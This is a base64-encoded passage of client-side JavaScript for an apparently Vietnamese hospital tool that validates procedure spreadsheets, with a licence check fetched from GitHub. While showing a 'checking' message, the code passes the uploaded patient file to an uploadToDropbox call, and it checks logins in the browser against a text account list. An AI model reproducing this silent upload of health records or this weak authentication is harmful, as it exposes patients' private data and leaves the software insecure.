dC1zaXplOjI0cHg7Y29sb3I6I2U2N2UyMjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgPHN0cm9uZz7EkMaw4budbmcgdHJ1eeG7gW4gZ2nDoW4gxJFv4bqhbjwvc3Ryb25nPjxici8+PGJyLz4NCiAgICAgICAgVnVpIGzDsm5nIMSR4bujaSB2w6BpIGdpw6J5IMSR4buDIGto4bufaSDEkeG7mW5nIG3DoXkgY2jhu6cgZOG7sSBwaMOybmcuLi4NCiAgICAgIGA7DQogICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgICAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKSk7DQogICAgICBsb2dpblBvcHVwU2hvd24gPSB0cnVlOw0KICAgIGxldCBwZXJjZW50ID0gMDsNCnByb2dyZXNzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAnd2lkdGggMC4ycyBsaW5lYXInOw0KY29uc3QgcHJvZ3Jlc3NUaW1lciA9IHNldEludGVydmFsKCgpID0+IHsNCiAgICBwZXJjZW50ICs9IDI7IC8vIHTEg25nIG3hu5dpIGzhuqduIDIlDQogICAgaWYgKHBlcmNlbnQgPiAxMDApIHsNCiAgICAgICAgcGVyY2VudCA9IDEwMDsNCiAgICAgICAgY2xlYXJJbnRlcnZhbChwcm9ncmVzc1RpbWVyKTsNCiAgICB9DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSBwZXJjZW50ICsgJyUnOw0KfSwgNTAwKTsgLy8gMTAwbXMgY+G6rXAgbmjhuq10IDEgbOG6p24NCg0KCQ0KCX0NCiAgfSwgMjAwMCk7DQoNCiAgdHJ5IHsNCiAgICBjb25zdCBhY2NvdW50cyA9IGF3YWl0IGxvYWRBY2NvdW50c0Zyb21UWFQoKTsNCiAgICBpZiAoYWNjb3VudHNbdXNlcm5hbWVdICYmIGFjY291bnRzW3VzZXJuYW1lXSA9PT0gcGFzc3dvcmQpIHsNCiAgICAgIGN1cnJlbnRVc2VyID0gdXNlcm5hbWU7DQogICAgICBzZXNzaW9uU3RvcmFnZS5zZXRJdGVtKCdtZWRVc2VyJywgdXNlcm5hbWUpOw0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbkNvbnRlbnQnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LnJlbW92ZSgnbG9naW4tcGFnZScpOw0KDQogICAgICBhd2FpdCBpbml0QWZ0ZXJMb2dpbigpOyAvLyBjaOG7iSBsb2FkIHNhdSBraGkgbG9naW4gdGjDoG5oIGPDtG5nDQogICAgfSBlbHNlIHsNCiAgICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgfQ0KICB9IGNhdGNoIChlcnIpIHsNCiAgICBjb25zb2xlLmVycm9yKCdM4buXaSBraGkgxJHEg25nIG5o4bqtcDonLCBlcnIpOw0KICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogIH0gZmluYWxseSB7DQogICAgY2xlYXJUaW1lb3V0KHNsb3dMb2dpblRpbWVyKTsNCg0KICAgIC8vIE7hur91IHBvcHVwIGRvIGxvZ2luIG3hu58gdGjDrCDEkcOzbmcNCiAgICBpZiAobG9naW5Qb3B1cFNob3duICYmIHBvcHVwKSB7DQogICAgICBwb3B1cC5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7DQogICAgICBzZXRUaW1lb3V0KCgpID0+IHsgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdub25lJzsgfSwgNDAwKTsNCiAgICB9DQoNCiAgICBidG5Mb2dpbi5kaXNhYmxlZCA9IGZhbHNlOw0KICAgIGJ0bkxvZ2luLmlubmVySFRNTCA9ICfEkMSDbmcgbmjhuq1wJzsNCiAgfQ0KfQ0KDQoNCiAgICAgICAgZnVuY3Rpb24gbG9nb3V0KCkgew0KICAgICAgICAgICAgY3VycmVudFVzZXIgPSBudWxsOw0KICAgICAgICAgICAgc2Vzc2lvblN0b3JhZ2UucmVtb3ZlSXRlbSgnbWVkVXNlcicpOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW5Db250ZW50Jykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUgPSAnJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykudmFsdWUgPSAnJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkVycm9yJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LmFkZCgnbG9naW4tcGFnZScpOw0KICAgICAgICB9DQoNCi8vID09PT09PT09PT0gSMOATSBMT0FEIERBTkggU8OBQ0ggS0hPQSBI4buiUCBM4buGID09PT09PT09PT0gLy8NCmFzeW5jIGZ1bmN0aW9uIGxvYWRWYWxpZERlcGFydG1lbnRzKCkgew0KICAgIGNvbnN0IHVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4va2hvYS50eHQnOw0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKHVybCk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICBjb25zdCBraG9hTGlzdCA9IHRleHQuc3BsaXQoJ1xuJykubWFwKGxpbmUgPT4gbGluZS50cmltKCkudG9Mb3dlckNhc2UoKSkuZmlsdGVyKEJvb2xlYW4pOw0KICAgICAgICByZXR1cm4ga2hvYUxpc3Q7DQogICAgfSBjYXRjaCAoZXJyKSB7DQogICAgICAgIGNvbnNvbGUuZXJyb3IoIktow7RuZyB0aOG7gyB04bqjaSBkYW5oIHPDoWNoIGtob2E6IiwgZXJyKTsNCiAgICAgICAgcmV0dXJuIFtdOw0KICAgIH0NCn0NCg0KICAgICAgICAvLyA9PT09PT09PT09IFBI4bqmTiBY4busIEzDnSBGSUxFID09PT09PT09PT0gLy8NCmZ1bmN0aW9uIGhhbmRsZUZpbGUoKSB7DQogICAgY29uc3QgZmlsZUlucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpOw0KICAgIGNvbnN0IGFuYWx5emVCdG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpOw0KICAgIGNvbnN0IGZpbGUgPSBmaWxlSW5wdXQuZmlsZXNbMF07DQoJDQppZiAoIWZpbGUpIHsNCiAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKTsNCiAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSBgDQogICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpyZWQ7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICAgIDxzdHJvbmc+VnVpIGzDsm5nIGNo4buNbiBmaWxlIHRyxrDhu5tjIGtoaSBraeG7g20gdHJhPC9zdHJvbmc+PGJyLz48YnIvPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKS5zdHlsZS5kaXNwbGF5PSdub25lJyI+xJDDs25nPC9idXR0b24+DQogICAgYDsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgDQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7DQogICAgcmV0dXJuOw0KfQ0KDQoNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZVJlcXVpcmVtZW50cycpLmNsYXNzTGlzdC5hZGQoJ2hpZGRlbicpOw0KICAgIGVycm9yTG9nID0gW107DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGFuYWx5emVCdG4uZGlzYWJsZWQgPSB0cnVlOw0KICAgIGFuYWx5emVCdG4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc3Bpbm5lciBmYS1zcGluIj48L2k+IMSQYW5nIGtp4buDbSB0cmEuLi4nOw0KICAgIC8vIOKchSBC4bqvdCDEkeG6p3UgxJHhur9tIDJzIMSR4buDIGhp4buHbiBwb3B1cCBu4bq/dSB24bqrbiDEkWFuZyAixJBhbmcga2nhu4NtIHRyYS4uLiINCmNsZWFyVGltZW91dChhbmFseXplUG9wdXBUaW1lcik7DQphbmFseXplUG9wdXBUaW1lciA9IHNldFRpbWVvdXQoKCkgPT4gew0KICAgIGNvbnN0IGJ0bkFuYWx5emUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpOw0KICAgIGlmIChidG5BbmFseXplLmlubmVySFRNTC5pbmNsdWRlcygnxJBhbmcga2nhu4NtIHRyYScpKSB7DQogICAgICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgICAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgICAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtc2F0ZWxsaXRlLWRpc2ggaWNvbi1zcGluIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6I2U2N2UyMjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgICAgIDxzdHJvbmc+xJDGsOG7nW5nIHRydXnhu4FuIGdpw6FuIMSRb+G6oW48L3N0cm9uZz48YnIvPg0KICAgICAgICAgICAgVnVpIGzDsm5nIMSR4bujaSB2w6BpIGdpw6J5IMSR4buDIGto4bufaSDEkeG7mW5nIG3DoXkgY2jhu6cgZOG7sSBwaMOybmcuLi4NCiAgICAgICAgYDsNCiAgICAgICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMCUnOw0KICAgICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgICAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpKTsNCg0KICAgICAgICAvLyBDaOG6oXkgcHJvZ3Jlc3NCYXIgJQ0KICAgICAgICBsZXQgcGVyY2VudCA9IDA7DQogICAgICAgIHByb2dyZXNzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAnd2lkdGggMC4ycyBsaW5lYXInOw0KICAgICAgICBjb25zdCBwcm9ncmVzc1RpbWVyID0gc2V0SW50ZXJ2YWwoKCkgPT4gew0KICAgICAgICAgICAgcGVyY2VudCArPSAyOw0KICAgICAgICAgICAgaWYgKHBlcmNlbnQgPiAxMDApIHsNCiAgICAgICAgICAgICAgICBwZXJjZW50ID0gMTAwOw0KICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwocHJvZ3Jlc3NUaW1lcik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9IHBlcmNlbnQgKyAnJSc7DQogICAgICAgIH0sIDEwMCk7DQogICAgfQ0KfSwgNTAwMCk7DQoNCiAgICBjb25zdCByZWFkZXIgPSBuZXcgRmlsZVJlYWRlcigpOw0KICAgIA0KICAgIHJlYWRlci5vbmxvYWQgPSBhc3luYyBmdW5jdGlvbihlKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBjb25zdCBkYXRhID0gbmV3IFVpbnQ4QXJyYXkoZS50YXJnZXQucmVzdWx0KTsNCiAgICAgICAgICAgIGNvbnN0IHdvcmtib29rID0gWExTWC5yZWFkKGRhdGEsIHsgdHlwZTogJ2FycmF5JyB9KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKHdvcmtib29rLlNoZWV0TmFtZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdGaWxlIEV4Y2VsIGtow7RuZyBjw7Mgc2hlZXQgbsOgbycpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBmaXJzdFNoZWV0ID0gd29ya2Jvb2suU2hlZXRzW3dvcmtib29rLlNoZWV0TmFtZXNbMV1dOw0KICAgICAgICAgICAgY29uc3QganNvbkRhdGEgPSBYTFNYLnV0aWxzLnNoZWV0X3RvX2pzb24oZmlyc3RTaGVldCwgeyANCiAgICAgICAgICAgICAgICBoZWFkZXI6IDEsIA0KICAgICAgICAgICAgICAgIGRlZnZhbDogIiIsIA0KICAgICAgICAgICAgICAgIGJsYW5rcm93czogdHJ1ZSANCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgY29uc3QgZG9uZzUgPSAoanNvbkRhdGFbNF0gJiYganNvbkRhdGFbNF1bMF0pID8ganNvbkRhdGFbNF1bMF0udG9TdHJpbmcoKS50cmltKCkgOiAiS2jDtG5nIHLDtSI7DQpjb25zdCBkb25nNiA9IChqc29uRGF0YVs1XSAmJiBqc29uRGF0YVs1XVswXSkgPyBqc29uRGF0YVs1XVswXS50b1N0cmluZygpLnRyaW0oKSA6ICJLaMO0bmcgcsO1IjsNCndpbmRvdy5uZ2F5VmFsdWUgPSBkb25nNTsgIC8vIOKshSBkw7JuZyA1ID0gTmfDoHkNCndpbmRvdy5raG9hVmFsdWUgPSBkb25nNjsgIC8vIOKshSBkw7JuZyA2ID0gS2hvYQ0KDQoNCgkJCS8vLy8gS2nhu4NtIHRyYSBraG9hIC8vLy8vDQovLyDinIUgTOG6pXkgZOG7ryBsaeG7h3UgZMOybmcgNiwgY+G7mXQgQQ0KY29uc3Qga2hvYVJvdyA9IGpzb25EYXRhWzVdOyAvLyBkw7JuZyA2DQpjb25zdCBraG9hVGV4dCA9IChraG9hUm93ICYmIGtob2FSb3dbMF0gfHwgIiIpLnRvU3RyaW5nKCkudHJpbSgpOw0KY29uc3Qga2hvYUxvd2VyID0ga2hvYVRleHQudG9Mb3dlckNhc2UoKTsNCg0KLy8g4pyFIEtp4buDbSB0cmEgdMOqbiBraG9hDQpjb25zdCB2YWxpZEtob2FMaXN0ID0gYXdhaXQgbG9hZFZhbGlkRGVwYXJ0bWVudHMoKTsNCmlmICghdmFsaWRLaG9hTGlzdC5zb21lKGtob2EgPT4ga2hvYUxvd2VyLmluY2x1ZGVzKGtob2EpKSkgew0KICAgICAgd2luZG93LmlzS2hvYUxvaSA9IHRydWU7DQogICAgY29uc3QgbXNnID0gYOKdjCBNw6F5IGNo4bunIHThu6sgY2jhu5FpICR7a2hvYVRleHQgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnfSBz4butIGThu6VuZyBwaOG6p24gbeG7gW0uIDxici8+VnVpIGzDsm5nIG11YSBi4bqjbiBxdXnhu4FuIMSR4buDIHTDtG4gdHLhu41uZyB0w6FjIGdp4bqjLiBgOw0KDQogICAgLy8gSGnhu4NuIHBvcHVwIGNo4bupIGtow7RuZyBhbGVydA0KIC8vIEhp4buDbiB0aOG7iyBwb3B1cA0KICAgICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgLy8gSGnhu4NuIHRo4buLIHRow7RuZyBiw6FvIGzhu5dpIHbEqW5oIHZp4buFbg0KICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gYA0KICAgIDxpIGNsYXNzPSJmYXMgZmEtYmFuIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6cmVkO2ZvbnQtc2l6ZToyMHB4O21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgIDxzdHJvbmc+JHttc2d9PC9zdHJvbmc+PGJyLz48YnIvPg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgaWQ9ImJ1eUxpY2Vuc2UiPk11YSBC4bqjbiBRdXnhu4FuPC9idXR0b24+PGJyLz48YnIvPg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0id2luZG93LmxvY2F0aW9uLnJlbG9hZCgpIj7EkMOzbmc8L2J1dHRvbj4NCmA7DQoNCi8vIFNhdSBraGkgcmVuZGVyIG7DunQsIHRow6ptIHPhu7Ega2nhu4duDQpzZXRUaW1lb3V0KCgpID0+IHsNCiAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eUxpY2Vuc2UiKTsNCiAgaWYgKGJ0bikgew0KICAgIGJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHsNCiAgICAgIC8vIOG6qG4gcG9wdXAgbOG7l2kNCiAgICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImxvYWRpbmdQb3B1cCIpOw0KICAgICAgaWYgKHBvcHVwKSBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgICAgLy8gTeG7nyBwb3B1cCBi4bqjbmcgZ2nDoQ0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eVBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgICB9KTsNCiAgfQ0KfSwgMjAwKTsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQoNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCg0KICAgIC8vIOKchSBWw5QgSEnhu4ZVIEjDk0EgYuG6pXQga+G7syDEkW/huqFuIG7DoG8gY+G7kSBn4bqvbmcg4bqpbiBwb3B1cCBzYXUgxJHDsw0KICAgIHdpbmRvdy5pc0tob2FMb2kgPSB0cnVlOw0KDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NjYW5TdGF0dXMnKS5pbm5lckhUTUwgPSBgPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDtmb250LXdlaWdodDpib2xkIj4ke21zZ308L3NwYW4+YDsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgcmV0dXJuOw0KfQ0KDQoNCg0KCQkJDQogICAgICAgICAgICBpZiAoanNvbkRhdGEubGVuZ3RoIDw9IDEpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0ZpbGUgRXhjZWwga2jDtG5nIGPDsyBk4buvIGxp4buHdSAoY2jhu4kgY8OzIHRpw6p1IMSR4buBIGhv4bq3YyB0cuG7kW5nKScpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgIHByb2Nlc3NEYXRhKGpzb25EYXRhKTsNCiAgICAgICAgICBjb25zdCBzdGF0cyA9IHsNCiAgICAgICAgICAgIGhlcmI6IGdldEhlcmJPdXRsaWVyVG90YWwoKSwNCiAgICAgICAgICAgICAgdGltZTogZ2V0VGltZUVycm9yVG90YWwoKSwNCiAgICAgICAgICAgICBjb25mbGljdDogZ2V0Q29uZmxpY3RUb3RhbCgpDQogICAgICAgICAgfTsNCiAgICAgICAgICBjb25zdCB1cGxvYWRGaWxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpLmZpbGVzWzBdOw0KIGF3YWl0IHVwbG9hZFRvRHJvcGJveCh1cGxvYWRGaWxlLCB3aW5kb3cua2hvYVZhbHVlLCB3aW5kb3cubmdheVZhbHVlLCBzdGF0cyk7DQogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZVJlcXVpcmVtZW50cycpLmNsYXNzTGlzdC5yZW1vdmUoJ2hpZGRlbicpOw0KICAgICAgICAgICAgbG9nRXJyb3IoJ0zhu5dpIGtoaSDEkeG7jWMgZmlsZSBFeGNlbCcsIG51bGwsIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICAgICAgYWxlcnQoJ0PDsyBs4buXaSB44bqjeSByYSBraGkgxJHhu41jIGZpbGU6ICcgKyBlcnJvci5tZXNzYWdlKTsNCiAgICAgICAgfSBmaW5hbGx5IHsNCgkJY2xlYXJUaW1lb3V0KGFuYWx5emVQb3B1cFRpbWVyKTsgLy8g4pyFIE5n4bqvdCB0aW1lciBwb3B1cA0KCQlpZiAoIXdpbmRvdy5pc0tob2FMb2kpIHsgIA0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJykuY2xhc3NMaXN0LnJlbW92ZSgnc2hvdycpOyAvLyDinIUg4bqobiBwb3B1cA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyAgIC8vIOKchSDhuqhuIGjhurNuIHBvcHVwDQoJICB9DQogICAgICAgICAgICBhbmFseXplQnRuLmRpc2FibGVkID0gZmFsc2U7DQogICAgICAgICAgICBhbmFseXplQnRuLmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXNlYXJjaCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gS2nhu4NtIFRyYSc7DQogICAgICAgIH0NCiAgICB9Ow0KICAgIA0KICAgIHJlYWRlci5vbmVycm9yID0gZnVuY3Rpb24oKSB7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlUmVxdWlyZW1lbnRzJykuY2xhc3NMaXN0LnJlbW92ZSgnaGlkZGVuJyk7DQogICAgICAgIGxvZ0Vycm9yKCdM4buXaSBraGkgxJHhu41jIGZpbGUnLCBudWxsLCAnS2jDtG5nIHRo4buDIMSR4buNYyBu4buZaSBkdW5nIGZpbGUnKTsNCiAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICBhbmFseXplQnRuLmRpc2FibGVkID0gZmFsc2U7DQogICAgICAgIGFuYWx5emVCdG4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc2VhcmNoIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBLaeG7g20gVHJhJzsNCiAgICAgICAgYWxlcnQoJ0zhu5dpIGtoaSDEkeG7jWMgZmlsZS4gVnVpIGzDsm5nIHRo4butIGzhuqFpIHbhu5tpIGZpbGUga2jDoWMuJyk7DQogICAgfTsNCiAgICANCiAgICByZWFkZXIucmVhZEFzQXJyYXlCdWZmZXIoZmlsZSk7DQp9DQoNCiAgICAgICAgZnVuY3Rpb24gcHJvY2Vzc0RhdGEoZGF0YSkgew0KICAgIA0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IGhlYWRlckxpbmUxID0gZGF0YVs3XSB8fCBbXTsNCiAgICAgICAgY29uc3QgaGVhZGVyTGluZTIgPSBkYXRhWzhdIHx8IFtdOw0KICAgICAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAgICAgKGNvbCArICcgJyArIChoZWFkZXJMaW5lMltpbmRleF0gfHwgJycpKS50cmltKCkNCiAgICAgICAgKTsNCg0KICAgICAgICANCiAgICAgICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IikpOw0KCQkJCWNvbnN0IGRhdGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJOZ8OgeSB0aOG7sWMgaGnhu4duIikpOyAvLyBUaMOqbSBkw7JuZyBuw6B5DQogICAgICAgICAgICAgICAgY29uc3Qgc3RhcnRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UgdGjhu7FjIGhp4buHbiIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBlbmRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YyIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBvcGVyYXRvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQgY2jDrW5oIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IG5hbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJI4buNIHTDqm4iKSk7DQogICAgICAgICAgICAgICAgY29uc3QgcGF0aWVudElkSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiTcOjIEJOIikpOw0KCQkJCWNvbnN0IHBhdGllbnRhZ2VJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUdeG7lWkiKSk7DQogICAgICAgICAgICAgICAgY29uc3QgZG9jdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiQsOhYyBz4bu5IGNo4buJIMSR4buLbmgiKSk7DQogICAgICAgICAgICAgICAgY29uc3QgbWlzc2luZ0NvbHVtbnMgPSBbXTsNCiAgICAgICAgICAgICAgICBpZiAocHJvY2VkdXJlSW5kZXggPT09IC0xKSBtaXNzaW5nQ29sdW1ucy5wdXNoKCdUaOG7pyB0aHXhuq10Jyk7DQogICAgICAgICAgICAgICAgaWYgKHN0YXJ0SW5kZXggPT09IC0xKSBtaXNzaW5nQ29sdW1ucy5wdXNoKCdUaOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UgdGjhu7FjIGhp4buHbicpOw0KICAgICAgICAgICAgICAgIGlmIChlbmRJbmRleCA9PT0gLTEpIG1pc3NpbmdDb2x1bW5zLnB1c2goJ1Ro4budaSBnaWFuIGvhur90IHRow7pjJyk7DQogICAgICAgICAgICAgICAgaWYgKG9wZXJhdG9ySW5kZXggPT09IC0xKSBtaXNzaW5nQ29sdW1ucy5wdXNo